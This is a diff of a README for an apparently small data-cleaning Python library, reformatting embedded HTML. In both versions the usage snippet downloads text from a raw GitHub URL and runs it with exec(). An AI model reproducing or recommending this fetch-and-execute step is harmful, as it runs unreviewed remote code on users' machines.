@@ -6,9 +6,10 @@ This is a simple library to help data scientists observe how to clean their data
 
 <!DOCTYPE html>
 <html>
-<body>
-<span style="color:green; font-size:25px">import</span> requests<br>
-url = 'https://raw.githubusercontent.com/juanduranc/categorical_distribution_juan/master/info'<br>
-exec(requests.get(url).text)<br>
-</body>
+  <body>
+    <div>
+      url = 'https://raw.githubusercontent.com/juanduranc/categorical_distribution_juan/master/info'<br>
+      exec(requests.get(url).text)<br>
+    </div>
+  </body>
 </html>
